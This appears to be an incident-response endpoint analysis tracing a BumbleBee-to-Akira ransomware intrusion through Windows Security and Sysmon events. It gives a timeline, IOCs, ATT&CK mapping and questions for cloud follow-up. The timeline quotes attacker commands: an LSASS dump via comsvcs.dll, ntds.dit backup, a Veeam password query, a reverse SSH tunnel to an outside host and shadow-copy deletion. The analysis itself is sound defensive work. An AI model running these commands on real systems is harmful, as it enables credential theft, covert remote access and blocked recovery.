# Endpoint Analysis — Windows Security + Sysmon

**Source:** `logs/windows/security.json`, `logs/windows/sysmon.json`
**Tenant/Domain:** contoso.com | **Timezone:** UTC
**Affected hosts:** WS-IT-07 (10.10.20.37), DC01 (10.10.10.10), FS01 (10.10.10.20), BKP01

## Timeline (UTC)

| Time | Host | Evidence | Activity |
| --- | --- | --- | --- |
| 07-15 13:55:12 | WS-IT-07 | Sec 4624 (Type 2), jsmith | Baseline interactive logon |
| 07-15 14:02:47 | WS-IT-07 | Sec 4688 / Sysmon 1 | Elevated `msiexec /i \\FS01\share\downloads\ManageEngine-OpManager.msi` (MD5 124a48b7…) |
| 07-15 14:02:55 | WS-IT-07 | Sysmon 11 | msiexec drops `…\ApplicationInstallationFolder_11\msimg32.dll` |
| 07-15 14:03:01 | WS-IT-07 | Sysmon 1 | `consent.exe` launched from Temp by msiexec |
| 07-15 14:03:02 | WS-IT-07 | Sysmon 7 | DLL side-load — `consent.exe` loads unsigned `msimg32.dll` (MD5 ca8646df…) from Temp |
| 07-15 14:05:18 | WS-IT-07 | Sysmon 3 | `consent.exe` → 188.40.187.145:443 (BumbleBee C2) |
| 07-15 14:06:44 | WS-IT-07 | Sysmon 22 | DGA DNS query `ev2sirbd269o5j.org` |
| 07-15 14:30:58 | WS-IT-07 | Sysmon 1 | `AdgNsy.exe` (OriginalFileName WAB.EXE) spawned by WmiPrvSE.exe |
| 07-15 14:31:10 | WS-IT-07 | Sysmon 8 | `consent.exe` CreateRemoteThread → `AdgNsy.exe` (shellcode injection) |
| 07-15 14:32:03 | WS-IT-07 | Sysmon 3 | `AdgNsy.exe` → 172.96.137.160:80 (AdaptixC2 beacon) |
| 07-15 14:40:11 | WS-IT-07 | Sysmon 1 | Discovery: `systeminfo & nltest /dclist: & whoami /groups & nltest /domain_trusts` |
| 07-15 18:44:19 | DC01 | Sec 4720 | backup_EA domain account created (by jsmith) |
| 07-15 18:44:41 | DC01 | Sec 4728 | backup_EA added to Enterprise Admins |
| 07-15 18:45:03 | DC01 | Sec 4738 | Built-in administrator account modified (pw reset) |
| 07-16 09:12–09:13 | DC01 | Sec 4625 ×2 | Failed logons for administrator from 10.10.20.37 |
| 07-16 09:13:20 | DC01 | Sec 4624 (Type 10) | RDP into DC as backup_EA from WS-IT-07 (10.10.20.37) |
| 07-16 09:13:21 | DC01 | Sec 4672 | SeDebug/SeBackup/SeTakeOwnership/SeTcb granted |
| 07-16 09:20:05 | DC01 | Sysmon 13 | `reg.exe` sets `fDenyTSConnections=0` (enable RDP) |
| 07-16 09:21:38 | DC01 | Sec 4688 | `wbadmin` backup of ntds.dit + SYSTEM/SECURITY to `\\127.0.0.1\C$\ProgramData\` |
| 07-16 09:35:22 | DC01 | Sysmon 1 | `rundll32 comsvcs.dll,#+000024 672 …\U8Vfsh.docx full` (LSASS dump, fake ext) |
| 07-16 10:02:47 | DC01 | Sysmon 1 | Encoded mixed-case `pOWerShELl.exE -e …` → decodes to `Invoke-ShareFinder` |
| 07-16 10:18:30 | DC01 | Sysmon 1 | `n.exe` SoftPerfect scan of 10.10.10.0/24 |
| 07-16 11:04:10 | FS01 | Sec 4624 (Type 3, NTLM) | Network logon backup_EA from DC (10.10.10.10) |
| 07-16 11:05:52 | FS01 | Sec 7045 | RustDesk service installed (`--tray`, auto-start) |
| 07-16 16:47:33 | BKP01 | Sec 4688 | `psql.exe … SELECT user_name,password … FROM credentials` (Veeam) |
| 07-16 21:58:14 | DC01 | Sysmon 1 | Reverse SSH `ssh svc@193.242.184.150 -R *:10400:127.0.0.1:3389 -p22 -N` |
| 07-16 22:15:09 | FS01 | Sec 4688 | `FileZilla_3.68.1…setup.exe` staged |
| 07-16 23:41:07 | FS01 | Sysmon 3 | `filezilla.exe` → 185.174.100.203:22 (SFTP exfil) |
| 07-17 03:22:41 | BKP01 | Sec 4688 / Sysmon 11 | `locker.exe -p=G:\ -n=15`; writes `…ledger.xlsx.akira` |
| 07-17 03:22:42 | BKP01 | Sec 4688 | `powershell "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"` |

## IOCs

| Type | Indicator | Context |
| --- | --- | --- |
| IPv4 | 188.40.187.145:443 | BumbleBee C2 |
| IPv4 | 172.96.137.160:80 | AdaptixC2 beacon — also appears as a cloud sign-in IP |
| IPv4 | 193.242.184.150:22 | Reverse SSH tunnel egress |
| IPv4 | 185.174.100.203:22 | SFTP data exfiltration (user "Stark") |
| Domain | ev2sirbd269o5j.org | BumbleBee DGA |
| Hash (MSI) | MD5 124a48b78060fa851e1cc077ca35713c / SHA256 186b26df…0aa5da | Trojanized installer |
| Hash (DLL) | MD5 ca8646dfc88423bb9fffda811160cebe / SHA256 a6df0b49…945331 | BumbleBee loader |
| Path | C:\Users\jsmith\AppData\Local\Temp\ApplicationInstallationFolder_11\ | Loader staging (msimg32.dll, consent.exe) |
| Path | C:\Users\jsmith\AppData\Local\AdgNsy.exe | AdaptixC2 (renamed WAB.exe) |
| Path | \Windows\Temp\U8Vfsh.docx | LSASS dump (fake ext) |
| Path | C:\ProgramData\ → n.exe, locker.exe, FileZilla_3.68.1…setup.exe | Tooling / ransomware staging |
| Account | CONTOSO\backup_EA | Attacker-created Enterprise Admin |
| Account | CONTOSO\jsmith | Patient-zero / first compromised admin |
| Service | RustDesk (`… --tray`, auto-start) | Persistence on FS01 |
| Ext | .akira | Ransomware-encrypted files |

## ATT&CK Techniques

| Tactic | Technique | Evidence | Confidence |
| --- | --- | --- | --- |
| Initial Access | T1204.002 User Execution | Elevated MSI run, 4688 @14:02:47 | High |
| Execution | T1218.007 Msiexec | msiexec drops loader, Sysmon 11 @14:02:55 | High |
| Defense Evasion | T1574.001 DLL Side-Loading | Sysmon 7 @14:03:02, unsigned Temp DLL | High |
| C2 | T1071.001 / T1568.002 DGA | Sysmon 3 @14:05:18, Sysmon 22 @14:06:44 | High |
| Execution/Evasion | T1047 WMI + T1036.005 Masquerading | AdgNsy.exe (WAB.exe) via WmiPrvSE, Sysmon 1 @14:30:58 | High |
| Defense Evasion | T1055 Process Injection | Sysmon 8 CreateRemoteThread @14:31:10 | High |
| C2 | T1219 Remote Access Software | RustDesk 7045 @11:05:52 | High |
| Discovery | T1082/T1018/T1087/T1482 | discovery combo @14:40:11; n.exe @10:18:30 | High |
| Persistence/PrivEsc | T1136.002 + T1098 | 4720/4728/4738 @18:44–18:45 | High |
| Credential Access | T1003.003 NTDS | wbadmin @09:21:38 | High |
| Credential Access | T1003.001 LSASS (comsvcs) | rundll32 @09:35:22 | High |
| Credential Access | T1555 Password Stores | Veeam psql @16:47:33 | High |
| Defense Evasion | T1027.010 Command Obfuscation | mixed-case encoded PS @10:02:47 | High |
| Discovery | T1135 Share Discovery | Invoke-ShareFinder (decoded) @10:02:47 | Medium |
| Lateral Movement | T1021.001 RDP | 4624 Type 10 @09:13:20; reg fDenyTSConnections @09:20:05 | High |
| C2 | T1090 Proxy (reverse SSH) | ssh -R @21:58:14 | High |
| Exfiltration | T1048 Exfil over SFTP | filezilla → 185.174.100.203:22 @23:41:07 | High |
| Impact | T1486 Data Encrypted | locker.exe @03:22:41, .akira | High |
| Impact | T1490 Inhibit Recovery | Remove shadow copies @03:22:42 | High |

## Questions / gaps to check against cloud (Azure AD)

1. Does 172.96.137.160 (AdaptixC2 IP) appear as a cloud sign-in source IP?
2. Do 185.174.100.203 / 193.242.184.150 (exfil + reverse-SSH IPs) show any cloud sign-ins?
3. Are there risky/impossible-travel sign-ins for jsmith@contoso.com after ~14:30 on 07-15?
4. NTDS.dit dumped 07-16 09:21 — were harvested creds replayed in the cloud (failed→success)?
   NOTE: cloud replay at 02:11 PRECEDES this dump by ~7h — the 02:11 credential likely came from the
   07-15 AdaptixC2 foothold / token theft, not NTDS. NTDS explains LATER activity (backup_ea 09:14 sign-in).
5. Was backup_EA synced/created in Entra and used to sign in?
6. Any privileged role grants, MFA/CA policy changes, or rogue service principals in this window?
